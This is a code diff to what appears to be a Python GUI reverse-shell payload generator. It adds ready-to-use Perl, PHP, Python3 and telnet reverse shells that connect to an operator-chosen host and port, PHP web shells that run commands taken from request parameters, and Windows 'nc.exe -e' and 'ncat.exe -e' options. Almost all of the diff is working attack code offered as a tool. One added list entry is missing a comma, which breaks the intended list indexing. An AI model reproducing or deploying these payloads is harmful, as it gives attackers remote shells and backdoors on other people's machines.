@@ -84,6 +84,7 @@ linux_payloads = [
     "Perl no sh",
     "PHP cmd",
     "PHP cmd2",
+    "PHP cmd small"
     "PHP exec",
     "Python3",
     "Telnet",
@@ -99,8 +100,8 @@ linux_dropdown.place(x=370, y=250)
 window_payloads = [
 
     "Select Windows Payload: ",
-    "Bash-i",
-    "Bash196",
+    "nc.exe -e",
+    "ncat.exe -e",
     "Bash Read Line",
     "Bash 5",
     "Bash UDP",
@@ -205,7 +206,8 @@ def generate_reverse_shell_payload():
         payload_command = "rcat {} {} -r sh".format(lhost, lport)
 
     elif linuxpayload == linux_payloads[13]:
-        payload_command = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{}:{}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'".format(lhost, lport)
+        payload_command = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{}:{}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'".format(
+            lhost, lport)
 
     elif linuxpayload == linux_payloads[14]:
         payload_command = '''<html>
@@ -227,16 +229,20 @@ def generate_reverse_shell_payload():
                              </html>'''
 
     elif linuxpayload == linux_payloads[15]:
-        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+        payload_command = "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>"
 
     elif linuxpayload == linux_payloads[16]:
-        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+        payload_command = "<?=`$_GET[0]`?>"
 
     elif linuxpayload == linux_payloads[17]:
-        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+        payload_command = "php -r '$sock=fsockopen(\"{}\",{});exec(\"sh <&3 >&3 2>&3\");'".format(lhost, lport)
 
     elif linuxpayload == linux_payloads[18]:
-        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+        payload_command = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'".format(
+            lhost, lport)
+
+    elif linuxpayload == linux_payloads[19]:
+        payload_command = "TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF".format(lhost, lport)
 
     else:
         payload_command = "Make a valid selection"
